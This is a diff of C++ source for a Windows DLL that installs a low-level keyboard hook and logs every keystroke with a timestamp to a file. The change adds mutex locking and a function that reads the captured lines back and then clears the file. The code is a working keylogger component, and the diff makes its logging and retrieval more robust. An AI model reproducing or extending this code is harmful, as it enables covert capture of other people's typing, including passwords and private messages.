@@ -31,9 +31,11 @@ HINSTANCE hDllInstance = 0;
 
 HANDLE tmpHandle = NULL;
 HWND hWindow = 0;
-std::ofstream file;
-std::list<int>* keyscode = NULL;
-
+std::ofstream file_out;
+std::ifstream file_in;
+std::list<std::string> lines;
+bool toerase = false;
+HANDLE mutex;
 int installThread();
 
 LRESULT CALLBACK kbproc(
@@ -41,55 +43,70 @@ LRESULT CALLBACK kbproc(
 )
 {
 	KBDLLHOOKSTRUCT keyInfo = *((KBDLLHOOKSTRUCT*)lparam);
+	DWORD result;
 
-	file << keyInfo.vkCode;              // File -> [timestamp]:[keycode]:[type]
+	result = WaitForSingleObject(mutex, INFINITE);
 
-	if (wparam == WM_KEYDOWN)
+	if (result == WAIT_OBJECT_0)
 	{
-		std::time_t t = std::time(nullptr);
-		/*
-		std::cout << (int)t << ":"
-			<< keyInfo.vkCode << ":"
-			<< "1" << std::endl;*/
-		file << (int)t << ":"
-			<< keyInfo.vkCode << ":"
-			<< "1" << std::endl;
-	}
-	if (wparam == WM_KEYUP)
-	{
-		std::time_t t = std::time(nullptr);
+		if (toerase) {
+			file_out.close();
+			file_in.close();
+			remove("key.txt");
+			file_out.open("key.txt");
+			file_in.open("key.txt");
+		}
 
-		file << (int)t << ":"
-			<< keyInfo.vkCode << ":"
-			<< "2" << std::endl;
-		std::cout << keyInfo.vkCode << "_UP ";
+		if (wparam == WM_KEYDOWN)
+		{
+			std::time_t t = std::time(nullptr);
+			file_out << (int) t << ":"
+					 << keyInfo.vkCode << ":"
+					 << "1" << std::endl;
+		}
+		if (wparam == WM_KEYUP)
+		{
+			std::time_t t = std::time(nullptr);
+
+			file_out << (int) t << ":"
+					 << keyInfo.vkCode << ":"
+					 << "2" << std::endl;
+			std::cout << keyInfo.vkCode << "_UP ";
+		}
+		if (!ReleaseMutex(mutex))
+		{
+		}
 	}
-	
 	return CallNextHookEx(hook, ncode, wparam, lparam);
-
 }
 
 int APIENTRY DllMain(HINSTANCE hInstance, DWORD fdwReason, PVOID pvReserved) {
 	switch (fdwReason)
 	{
-	case DLL_PROCESS_ATTACH:
-		hDllInstance = hInstance;
-		file.open("key.txt");
-		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&installThread, 0, 0, 0);
-		//add_log("Attached.");
-		break;
-	case DLL_PROCESS_DETACH:
-		std::cout << "Processe unattached" << std::endl;
-		file.close();
-		if (UnhookWindowsHookEx(hook) == 0)
-			return (-1);
-		return (0);
-		//UninstallHook();
-		break;
+		case DLL_PROCESS_ATTACH:
+			hDllInstance = hInstance;
+			file_in.open("key.txt");
+			file_out.open("key.txt");
+			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)&installThread, 0, 0, 0);
+			toerase = false;
+			//add_log("Attached.");
+			mutex = CreateMutex(
+					NULL,                       // default security attributes
+					FALSE,                      // initially not owned
+					NULL);
+			break;
+		case DLL_PROCESS_DETACH:
+			std::cout << "Processe unattached" << std::endl;
+			file_in.close();
+			file_out.close();
+			if (UnhookWindowsHookEx(hook) == 0)
+				return (-1);
+			return (0);
+			//UninstallHook();
+			break;
 	}
 	return TRUE;
 }
-
 int installThread()
 {
 	std::cout << "Processe attached" << std::endl;
@@ -105,10 +122,21 @@ int installThread()
 	return (0);
 }
 
-int install()
+int getElements(std::list<std::string>& list)
 {
+	DWORD result;
 
+	result = WaitForSingleObject(mutex, INFINITE);
+
+	if (result == WAIT_OBJECT_0)
+	{
+		std::string buffer;
+		while (getline(file_in, buffer))
+			list.push_back(buffer);
+		toerase = true;
+		if (!ReleaseMutex(mutex))
+		{
+		}
+	}
 	return (0);
 }
-
-
